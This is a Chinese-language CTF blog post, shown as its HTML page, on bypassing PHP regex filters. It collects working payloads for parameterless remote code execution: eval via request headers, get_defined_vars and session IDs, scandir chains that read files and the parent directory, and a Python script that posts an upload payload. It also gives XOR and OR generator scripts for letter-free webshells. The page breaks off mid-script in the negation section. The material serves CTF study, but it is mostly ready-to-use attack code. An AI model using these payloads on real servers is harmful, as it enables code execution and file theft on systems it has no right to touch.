<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.7.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.7.0" type="image/png" sizes="32x32"><meta name="description" content="之前做WEB类的题目时一直会在正则过滤卡很久；加上这次在鲲鹏杯的测试平台也遇到了；所以写下这篇关于正则匹配的绕过">
<meta property="og:type" content="article">
<meta property="og:title" content="正则匹配的绕过">
<meta property="og:url" content="https://hyggevv.github.io/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/index.html">
<meta property="og:site_name" content="hey&#39;s blog">
<meta property="og:description" content="之前做WEB类的题目时一直会在正则过滤卡很久；加上这次在鲲鹏杯的测试平台也遇到了；所以写下这篇关于正则匹配的绕过">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/1.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/2.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/3.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/4.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/5.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/6.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/7.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/8.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/9.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/11.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/12.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/10.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/13.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/14.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/15.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/16.png">
<meta property="article:published_time" content="2023-04-07T14:39:43.000Z">
<meta property="article:modified_time" content="2023-04-25T15:49:35.845Z">
<meta property="article:author" content="hey">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hyggevv.github.io/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/1.png"><title>正则匹配的绕过 | hey's blog</title><link ref="canonical" href="https://hyggevv.github.io/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.7.0"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"carbon","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: true,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"複製","copySuccess":"複製成功","copyError":"複製失敗"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首頁</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">歸檔</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分類</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">標籤</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">關於</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/read/"><span class="header-nav-menu-item__icon"><i class="fas fa-book"></i></span><span class="header-nav-menu-item__text">menu.read</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">hey's blog</div><div class="header-banner-info__subtitle">天气转晴太阳崭新我在前进</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">正则匹配的绕过</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">發表於</span><span class="post-meta-item__value">2023-04-07</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新於</span><span class="post-meta-item__value">2023-04-25</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">閱讀次數</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
        <h2 id="1-无参数RCE">
          <a href="#1-无参数RCE" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-无参数RCE" class="headerlink" title="1.无参数RCE"></a>1.无参数RCE</h2>
      <p>在鲲鹏杯的测试中因为之前没有接触过这个无参数RCE导致错失一血；所以今天来统一的总结一下无参数RCE的一些payload</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;,$_GET[&#x27;code&#x27;]))</span><br></pre></td></tr></table></div></figure>
<p>这个一般出现在无参数的RCE绕过中；我们来解读一下这个到底过滤了什么东西<br>‘&#x2F;[^\W]+’:<br>1.[^\W]:匹配任意非单词的字符，即为[^a-zA-Z0-9]  2.+:匹配无穷次<br>(?R)?:<br>1.(?R):回溯；在相同的位置匹配整个表达式；可以看成把&#x2F;[^\W]+((?R)?)&#x2F;,这个式子再放到(?R)的位置  2：？匹配多次<br>(:左括号 ):右括号</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">该正则只允许执行</span><br><span class="line">a(b(c()));a()</span><br><span class="line">不允许执行</span><br><span class="line">a(&#x27;123&#x27;);即无法执行system(&#x27;ls&#x27;)这一类带有参数的命令</span><br></pre></td></tr></table></div></figure>
<p>而为什么这个叫无参数RCE呢就是因为:我们传入的值函数不能带有参数，所以我们要使用无参数的函数进行文件读取或者命令执行</p>

        <h2 id="关键函数一：getallheaders-：">
          <a href="#关键函数一：getallheaders-：" class="heading-link"><i class="fas fa-link"></i></a><a href="#关键函数一：getallheaders-：" class="headerlink" title="关键函数一：getallheaders()："></a>关键函数一：getallheaders()：</h2>
      <p>getallheaders()：作用：获取所有 HTTP 请求标头；传入?code&#x3D;print_r(getallheaders());，数组返回 HTTP 请求头<br><img src="/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/1.png"><br>payload1:(适合php7以上的版本)：使用var_dump(getenv(phpinfo()));查看环境变量</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /?code=eval(end(apache_request_headers())); HTTP/1.1</span><br><span class="line">.....</span><br><span class="line">flag: system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></div></figure>
<p>payload2:<br>使用end指向最后一个请求头，用其值进行rce;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /?code=eval(end(getallheaders())); HTTP/1.1</span><br><span class="line">.....</span><br><span class="line">flag: system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/2.png"></p>

        <h2 id="关键函数二：get-defined-vars">
          <a href="#关键函数二：get-defined-vars" class="heading-link"><i class="fas fa-link"></i></a><a href="#关键函数二：get-defined-vars" class="headerlink" title="关键函数二：get_defined_vars():"></a>关键函数二：get_defined_vars():</h2>
      <p>get_defined_vars()：<br>作用：返回由所有已定义变量所组成的数组，会返回$GET,$POST,$COOKIE,$FILES全局变量的值，返回数组顺序为get-&gt;post-&gt;cookie-&gt;file<br>current()：<br>作用：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回$GET变量的数组值<br>paylaod1:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(end(current(get_defined_vars())));&amp;flag=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/3.png"><br>payload2:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=system(&#x27;dir&#x27;);&amp;code=eval(pos(pos(get_defined_vars())));</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/4.png"><br>payload3:<br>而如果网站对$GET,$POST,$COOKIE都做的过滤，那我们只能从$FILES入手了，file数组在最后一个，需要end定位，然后pos两次定位获得文件名<br>exp：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">files = &#123;</span><br><span class="line">   &quot;system(&#x27;whoami&#x27;);&quot;: &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">#data = &#123;</span><br><span class="line">#&quot;code&quot;:&quot;eval(pos(pos(end(get_defined_vars()))));&quot;</span><br><span class="line">#&#125;</span><br><span class="line">r = requests.post(&#x27;http://your_vps_ip/1.php?code=eval(pos(pos(end(get_defined_vars()))));&#x27;, files=files)</span><br><span class="line">print(r.content.decode(&quot;utf-8&quot;, &quot;ignore&quot;))</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/5.png"></p>

        <h2 id="关键函数三：session-start-：">
          <a href="#关键函数三：session-start-：" class="heading-link"><i class="fas fa-link"></i></a><a href="#关键函数三：session-start-：" class="headerlink" title="关键函数三：session_start()："></a>关键函数三：session_start()：</h2>
      <p>适用于：php7以下的版本<br>● session_start()：启动新会话或者重用现有会话，成功开始会话返回 TRUE ，反之返回 FALSE,返回参数给session_id()<br>● session_id()：获取&#x2F;设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符串（””）。</p>
<p>文件读取payload:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">show_source(session_id(session_start()));</span><br><span class="line">var_dump(file_get_contents(session_id(session_start())));</span><br><span class="line">highlight_file(session_id(session_start()));</span><br><span class="line">readfile(session_id(session_start()));</span><br><span class="line">抓包传入Cookie: PHPSESSID=(想读的文件)即可</span><br><span class="line"></span><br><span class="line">GET /?code=show_source(session_id(session_start())); HTTP/1.1</span><br><span class="line">Cookie: PHPSESSID=/flag</span><br></pre></td></tr></table></div></figure>
<p>命令执行payload:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /?code=eval(hex2bin(session_id(session_start()))); HTTP/1.1</span><br><span class="line">Cookie: PHPSESSID=706870696e666f28293b (&quot;system(&#x27;命令&#x27;)&quot;的十六进制)</span><br></pre></td></tr></table></div></figure>



        <h2 id="关键函数四：scandir-：">
          <a href="#关键函数四：scandir-：" class="heading-link"><i class="fas fa-link"></i></a><a href="#关键函数四：scandir-：" class="headerlink" title="关键函数四：scandir()："></a>关键函数四：scandir()：</h2>
      <p>文件读取<br>查看当前目录文件名payload:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/6.png"></p>
<p>读取当前目录文件payload:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">当前目录倒数第一位文件：</span><br><span class="line">show_source(end(scandir(getcwd())));</span><br><span class="line">show_source(current(array_reverse(scandir(getcwd()))));</span><br><span class="line"></span><br><span class="line">当前目录倒数第二位文件：</span><br><span class="line">show_source(next(array_reverse(scandir(getcwd()))));</span><br><span class="line"></span><br><span class="line">随机返回当前目录文件：</span><br><span class="line">highlight_file(array_rand(array_flip(scandir(getcwd()))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(getcwd()))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/7.png"></p>
<p>查看上一级目录文件名payload:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(dirname(getcwd())));</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/8.png"></p>
<p>读取上级目录文件payload:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/9.png"></p>

        <h2 id="2-无字母数字webshell">
          <a href="#2-无字母数字webshell" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-无字母数字webshell" class="headerlink" title="2.无字母数字webshell"></a>2.无字母数字webshell</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&#x27;/[A-Za-z0-9]/is&#x27;,$_GET[&#x27;shell&#x27;])) </span><br></pre></td></tr></table></div></figure>
<p>此时正则的匹配便是不能出现字母和数字此时我们将payload成为无字母数字的webshell；我们在NKCTF中就有遇到过这个无字母数字的webshell</p>

        <h2 id="绕过方法一：异或绕过">
          <a href="#绕过方法一：异或绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#绕过方法一：异或绕过" class="headerlink" title="绕过方法一：异或绕过"></a>绕过方法一：异或绕过</h2>
      <p>exp1:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*author yu22x*/</span><br><span class="line"></span><br><span class="line">$myfile = fopen(&quot;xor_rce.txt&quot;, &quot;w&quot;);</span><br><span class="line">$contents=&quot;&quot;;</span><br><span class="line">for ($i=0; $i &lt; 256; $i++) &#123; </span><br><span class="line">    for ($j=0; $j &lt;256 ; $j++) &#123; </span><br><span class="line"></span><br><span class="line">        if($i&lt;16)&#123;</span><br><span class="line">            $hex_i=&#x27;0&#x27;.dechex($i);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $hex_i=dechex($i);</span><br><span class="line">        &#125;</span><br><span class="line">        if($j&lt;16)&#123;</span><br><span class="line">            $hex_j=&#x27;0&#x27;.dechex($j);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $hex_j=dechex($j);</span><br><span class="line">        &#125;</span><br><span class="line">        $preg = &#x27;/[a-z0-9]/i&#x27;; //根据题目给的正则表达式修改即可</span><br><span class="line">        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">                    echo &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        else&#123;</span><br><span class="line">        $a=&#x27;%&#x27;.$hex_i;</span><br><span class="line">        $b=&#x27;%&#x27;.$hex_j;</span><br><span class="line">        $c=(urldecode($a)^urldecode($b));</span><br><span class="line">        if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;</span><br><span class="line">            $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite($myfile,$contents);</span><br><span class="line">fclose($myfile);</span><br></pre></td></tr></table></div></figure>
<p>exp2:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line"># author yu22x</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">from sys import *</span><br><span class="line">import os</span><br><span class="line">def action(arg):</span><br><span class="line">   s1=&quot;&quot;</span><br><span class="line">   s2=&quot;&quot;</span><br><span class="line">   for i in arg:</span><br><span class="line">       f=open(&quot;xor_rce.txt&quot;,&quot;r&quot;)</span><br><span class="line">       while True:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           if t==&quot;&quot;:</span><br><span class="line">               break</span><br><span class="line">           if t[0]==i:</span><br><span class="line">               #print(i)</span><br><span class="line">               s1+=t[2:5]</span><br><span class="line">               s2+=t[6:9]</span><br><span class="line">               break</span><br><span class="line">       f.close()</span><br><span class="line">   output=&quot;(\&quot;&quot;+s1+&quot;\&quot;^\&quot;&quot;+s2+&quot;\&quot;)&quot;</span><br><span class="line">   return(output)</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">   param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot;</span><br><span class="line">   print(param)</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/11.png"></p>

        <h2 id="绕过方法二：或运算绕过">
          <a href="#绕过方法二：或运算绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#绕过方法二：或运算绕过" class="headerlink" title="绕过方法二：或运算绕过"></a>绕过方法二：或运算绕过</h2>
      <p>exp1:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$myfile = fopen(&quot;or_rce.txt&quot;, &quot;w&quot;);</span><br><span class="line">$contents=&quot;&quot;;</span><br><span class="line">for ($i=0; $i &lt; 256; $i++) &#123; </span><br><span class="line">for ($j=0; $j &lt;256 ; $j++) &#123; </span><br><span class="line"></span><br><span class="line">if($i&lt;16)&#123;</span><br><span class="line">$hex_i=&#x27;0&#x27;.dechex($i);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$hex_i=dechex($i);</span><br><span class="line">&#125;</span><br><span class="line">if($j&lt;16)&#123;</span><br><span class="line">$hex_j=&#x27;0&#x27;.dechex($j);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$hex_j=dechex($j);</span><br><span class="line">&#125;</span><br><span class="line">$preg = &#x27;/[0-9a-z]/i&#x27;;    // 根据题目给的正则表达式修改即可</span><br><span class="line">if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">echo &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else&#123;</span><br><span class="line">$a=&#x27;%&#x27;.$hex_i;</span><br><span class="line">$b=&#x27;%&#x27;.$hex_j;</span><br><span class="line">$c=(urldecode($a)|urldecode($b));</span><br><span class="line">if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;</span><br><span class="line">$contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite($myfile,$contents);</span><br><span class="line">fclose($myfile);</span><br></pre></td></tr></table></div></figure>
<p>exp2:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">def action(arg):</span><br><span class="line"> s1=&quot;&quot;</span><br><span class="line"> s2=&quot;&quot;</span><br><span class="line"> for i in arg:</span><br><span class="line">     f=open(&quot;D:/phpstorm/hey-php/or_rce.txt&quot;,&quot;r&quot;)</span><br><span class="line">     while True:</span><br><span class="line">         t=f.readline()</span><br><span class="line">         if t==&quot;&quot;:</span><br><span class="line">            break</span><br><span class="line">         if t[0]==i:</span><br><span class="line">            #print(i)</span><br><span class="line">            s1+=t[2:5]</span><br><span class="line">            s2+=t[6:9]</span><br><span class="line">            break</span><br><span class="line">     f.close()</span><br><span class="line">     output=&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;</span><br><span class="line">     return(output)</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line"> param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot;</span><br><span class="line"> print(param)</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/12.png"></p>

        <h2 id="绕过方法三：取反绕过">
          <a href="#绕过方法三：取反绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#绕过方法三：取反绕过" class="headerlink" title="绕过方法三：取反绕过"></a>绕过方法三：取反绕过</h2>
      <p>exp1:(这个需要在命令执行框中执行)</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//在命令行中运行</span><br><span class="line"></span><br><span class="line">/*author yu22x*/</span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,&#x27;[+]your function: &#x27;);</span><br><span class="line"></span><br><span class="line">$system=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); </span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,&#x27;[+]your command: &#x27;);</span><br><span class="line"></span><br><span class="line">$command=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); </span><br><span class="line"></span><br><span class="line">echo &#x27;[*] 